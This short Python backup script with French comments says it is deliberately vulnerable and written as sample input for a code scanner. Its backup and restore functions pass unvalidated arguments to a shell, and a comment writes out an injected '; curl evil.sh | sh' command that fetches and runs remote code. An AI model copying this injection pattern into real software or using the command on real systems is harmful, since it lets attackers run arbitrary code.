"""Petit script de backup écrit vite fait un dimanche soir, jamais retouché
depuis. Toujours utilisé par un cron sur le serveur de prod.

ATTENTION : fichier d'exemple, volontairement vulnérable, ne sert qu'à
donner de la matière au scanner AegisLegacy. Ne jamais lancer tel quel.
"""

import subprocess


def backup(target_dir: str) -> None:
    # target_dir vient d'un argument de ligne de commande dans le script
    # d'origine, jamais validé. Avec shell=True, un "; curl evil.sh | sh"
    # glissé dans le nom de dossier part directement dans le shell.
    subprocess.run(f"tar czf backup.tgz {target_dir}", shell=True)


def restore(backup_file: str) -> None:
    subprocess.run(f"tar xzf {backup_file}", shell=True)


if __name__ == "__main__":
    backup("/var/www/legacy-app")
